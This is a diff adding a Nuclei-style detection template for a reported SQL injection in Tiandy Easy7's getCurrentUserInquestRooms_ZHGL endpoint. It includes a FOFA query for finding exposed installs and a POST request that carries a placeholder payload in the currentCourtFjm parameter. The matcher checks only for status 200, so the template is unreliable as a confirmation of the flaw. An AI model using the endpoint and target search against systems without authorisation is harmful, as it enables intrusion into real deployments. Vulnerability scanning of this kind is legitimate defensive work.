@@ -1,0 +1,26 @@
+id: poc-wp6sar959pb9sgu4
+info:
+  name: 天地伟业Easy7 getCurrentUserInquestRooms_ZHGL 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wp6sar959pb9sgu4'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wp6sar959pb9sgu4
+    fofa: app="Tiandy-Easy7"
+http:
+- raw:
+  - 'POST /Easy7/rest/inquestRoom/getCurrentUserInquestRooms_ZHGL HTTP/1.1
+
+    Host:www.hacktwohub.com
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    currentCourtFjm=SQLI_POC'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
